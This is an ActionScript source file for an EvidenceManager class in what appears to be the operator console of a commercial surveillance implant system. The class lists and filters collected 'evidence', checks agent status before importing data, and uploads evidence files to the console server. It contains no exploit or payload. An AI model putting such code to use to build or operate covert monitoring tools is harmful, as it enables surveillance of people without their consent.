package it.ht.rcs.console.evidence.controller
{
  import flash.events.Event;
  import flash.events.HTTPStatusEvent;
  import flash.events.IOErrorEvent;
  import flash.events.SecurityErrorEvent;
  import flash.filesystem.File;
  import flash.net.URLRequest;
  
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.controller.ItemManager;
  import it.ht.rcs.console.events.SessionEvent;
  import it.ht.rcs.console.evidence.model.Evidence;
  import it.ht.rcs.console.utils.AlertPopUp;
  
  import mx.collections.ArrayCollection;
  import mx.collections.AsyncListView;
  import mx.collections.ListCollectionView;
  import mx.events.CollectionEvent;
  import mx.rpc.events.ResultEvent;
  
  public class EvidenceManager extends ItemManager
  {
    
    public function EvidenceManager() { super(Evidence); }
    
    /* singleton */
    private static var _instance:EvidenceManager = new EvidenceManager();
    public static function get instance():EvidenceManager { return _instance; } 
    
    [Bindable]
    public var evidenceFilter:Object = {};
    
    [Bindable]
    public var infoFilter:Object = {};
    
    override public function refresh():void
    {
      super.refresh();
      DB.instance.evidence.all(evidenceFilter, onResult);
    }
    
    [Bindable]
    public var _view:ListCollectionView;
    
    private function onResult(e:ResultEvent):void
    {
      var alv:AsyncListView = new AsyncListView(e.result as ArrayCollection);
      alv.list.addEventListener(CollectionEvent.COLLECTION_CHANGE, onItemsChange);
      _view = new ListCollectionView(alv);
      dispatchDataLoadedEvent();
    }
    
    override protected function onItemUpdate(event:*):void
    {
      if (event.property == 'data') return; // TODO: temporary fix. when applying filters, an update to "data" fires... ?
      
      var property:Object = new Object();
      property[event.property] = event.newValue is ArrayCollection ? event.newValue.source : event.newValue;
      DB.instance.evidence.update(event.source, property, evidenceFilter.target);
    }
    
    public function info(onInfoResult:Function):void
    {
      DB.instance.evidence.info(infoFilter, onInfoResult);
    }
    
    public function sync(factory:String, instance:String, platform:String, version:String, user:String, device:String, onResult:Function = null):void
    {
      DB.instance.evidence.agent_status({ident: factory, instance: instance, subtype: platform}, function (event:ResultEvent):void {
                
        if (event.result.status == 'OPEN' && event.result.deleted == false) {
          // send the sync parameters
          DB.instance.evidence.sync_start({bid: event.result._id, user: user, device: device, sync_time: (new Date().time) / 1000}); 
          DB.instance.evidence.sync_stop({bid: event.result._id});

          onResult(event);
        } else {
          AlertPopUp.show("Invalid Agent Status, cannot import");
        }
      });
    }
    
    public function uploadEvidence(id:String, file:File, onResult:Function = null, onFault:Function = null):void
    {      
      file.addEventListener(Event.COMPLETE, onResult);
      file.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onFault);
      file.addEventListener(HTTPStatusEvent.HTTP_STATUS, onFault);
      file.addEventListener(IOErrorEvent.IO_ERROR, onFault);
      file.upload(new URLRequest(DB.hostAutocomplete(Console.currentSession.server) + "evidence/create/" + id), "content");
    }
    
    override protected function onLogout(e:SessionEvent):void
    {
      super.onLogout(e);
      evidenceFilter={};
      _view = null;
    }
    
  }
  
}